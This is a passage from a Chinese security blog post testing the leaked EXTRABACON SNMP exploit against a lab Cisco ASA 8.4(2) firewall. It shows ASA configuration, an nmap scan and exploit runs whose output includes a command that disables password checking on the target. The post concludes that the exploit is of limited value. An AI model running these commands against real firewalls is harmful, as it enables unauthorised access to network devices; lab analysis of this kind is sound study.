<figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ciscoasa(config)# snmp-server host <span class="keyword">inside</span> 0.0.0.0 community public     </span><br><span class="line">ERROR: Not a valid host address - 0.0.0.0</span><br></pre></td></tr></table></figure>
<figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ciscoasa(config)# snmp-server host <span class="keyword">inside</span> 192.168.56.0 community public</span><br></pre></td></tr></table></figure>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ sudo nmap <span class="number">192.168</span>.56.150 -p161 -sU</span><br><span class="line"></span><br><span class="line">Starting Nmap <span class="number">7.01</span> ( <span class="string">https:</span><span class="comment">//nmap.org ) at 2016-09-01 15:07 CST</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.56.150</span><br><span class="line">Host is up (<span class="number">0.00018</span>s latency).</span><br><span class="line">PORT    STATE         SERVICE</span><br><span class="line"><span class="number">161</span>/udp open|filtered snmp</span><br><span class="line">MAC <span class="string">Address:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:<span class="number">89</span>:<span class="number">2</span><span class="string">B:</span><span class="number">96</span> (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap <span class="string">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">0.85</span> seconds</span><br></pre></td></tr></table></figure>
<figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ciscoasa(config)# snmp-server host <span class="keyword">inside</span> 192.168.56.0 255.255.255.0 community$</span><br><span class="line"></span><br><span class="line">snmp-server host <span class="keyword">inside</span> 192.168.56.0 255.255.255.0 community public</span><br><span class="line">                                     ^</span><br><span class="line">ERROR: % Invalid input detected at '^' marker.</span><br><span class="line">ciscoasa(config)# snmp-server host <span class="keyword">inside</span> 192.168.56.0/24 community public     </span><br><span class="line">                                                      ^</span><br><span class="line">ERROR: % Invalid input detected at '^' marker.</span><br></pre></td></tr></table></figure>
<p>可以看出, 因为不允许设置子网掩码, 所以根本没法输入网络地址, 只能输入单个ip</p>
<p>\3. snmp的community认证问题, public为我们设置的认证字符串, 比如我们改一改</p>
<figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ciscoasa(config)# snmp-server host <span class="keyword">inside</span> 192.168.56.1 community public-test</span><br></pre></td></tr></table></figure>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ python extrabacon_1.1.0.1.py info -t 192.168.56.150 -c public</span><br><span class="line">WARNING: No route found for IPv6 destination :: (no default route?)</span><br><span class="line">Logging to /EXPLOITS/EXBA/concernedparent</span><br><span class="line">[+] Executing:  extrabacon_1.1.0.1.py info -t 192.168.56.150 -c public</span><br><span class="line">[+] probing target via snmp</span><br><span class="line">[+] Connecting to 192.168.56.150:161</span><br><span class="line"><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span></span><br><span class="line">Traceback (most recent call last):</span><br></pre></td></tr></table></figure>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">$ python extrabacon_1.1.0.1.py info -t 192.168.56.150 -c public-test</span><br><span class="line">WARNING: No route found for IPv6 destination :: (no default route?)</span><br><span class="line">Logging to /EXPLOITS/EXBA/concernedparent</span><br><span class="line">[+] Executing:  extrabacon_1.1.0.1.py info -t 192.168.56.150 -c public-test</span><br><span class="line">[+] probing target via snmp</span><br><span class="line">[+] Connecting to 192.168.56.150:161</span><br><span class="line"><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span></span><br><span class="line">[+] response:</span><br><span class="line"><span class="comment">###[ SNMP ]###</span></span><br><span class="line">  version   = <span class="variable">&lt;ASN1_INTEGER[1L]&gt;</span></span><br><span class="line">  community = <span class="variable">&lt;ASN1_STRING['public-test']&gt;</span></span><br><span class="line">  \PDU       \</span><br><span class="line">   |<span class="string">###[ SNMPresponse ]###</span><br><span class="line">   </span>|<span class="string">  id        = &lt;ASN1_INTEGER[0L]&gt;</span><br><span class="line">   </span>|<span class="string">  error     = &lt;ASN1_INTEGER[0L]&gt;</span><br><span class="line">   </span>|<span class="string">  error_index= &lt;ASN1_INTEGER[0L]&gt;</span><br><span class="line">   </span>|<span class="string">  \varbindlist\</span><br><span class="line">   </span>|<span class="string">   </span>|<span class="string">###[ SNMPvarbind ]###</span><br><span class="line">   </span>|<span class="string">   </span>|<span class="string">  oid       = &lt;ASN1_OID['.1.3.6.1.2.1.1.1.0']&gt;</span><br><span class="line">   </span>|<span class="string">   </span>|<span class="string">  value     = &lt;ASN1_STRING['Cisco Adaptive Security Appliance Version 8.4(2)']&gt;</span><br><span class="line">   </span>|<span class="string">   </span>|<span class="string">###[ SNMPvarbind ]###</span><br><span class="line">   </span>|<span class="string">   </span>|<span class="string">  oid       = &lt;ASN1_OID['.1.3.6.1.2.1.1.3.0']&gt;</span><br><span class="line">   </span>|<span class="string">   </span>|<span class="string">  value     = &lt;ASN1_TIME_TICKS[150100L]&gt;</span><br><span class="line">   </span>|<span class="string">   </span>|<span class="string">###[ SNMPvarbind ]###</span><br><span class="line">   </span>|<span class="string">   </span>|<span class="string">  oid       = &lt;ASN1_OID['.1.3.6.1.2.1.1.5.0']&gt;</span><br><span class="line">   </span>|<span class="string">   </span>|<span class="string">  value     = &lt;ASN1_STRING['ciscoasa']&gt;</span><br><span class="line"></span><br><span class="line">[+] firewall uptime is 150100 time ticks, or 0:25:01</span><br><span class="line"></span><br><span class="line">[+] firewall name is ciscoasa</span><br><span class="line"></span><br><span class="line">[+] target is running asa842, which is supported</span><br><span class="line">Data stored in key file  : asa842</span><br><span class="line">Data stored in self.vinfo: ASA842</span><br><span class="line"></span><br><span class="line">To check the key file to see if it really contains what we're claiming:</span><br><span class="line"># cat /EXPLOITS/EXBA/keys/OpezI1.key</span><br><span class="line"></span><br><span class="line">To disable password checking on target:</span><br><span class="line"># extrabacon_1.1.0.1.py exec -k OpezI1 -t 192.168.56.150 -c public-test --mode pass-disable</span><br><span class="line"></span><br><span class="line">To enable password checking on target:</span></span><br></pre></td></tr></table></figure>
<p>在密码不对的情况下snmp根本连不上</p>
<p>上述三种条件, 导致了该漏洞是非常鸡肋的RCE, 首先你需要能访问SNMP, 访问SNMP需要你在防火墙的白名单中, 然后还要知道Community认证的密码.</p>
]]></content:encoded>
      <comments>http://0x48.pw/2016/08/31/0x21/#disqus_comments</comments>
    </item>
    
  </channel>
</rss>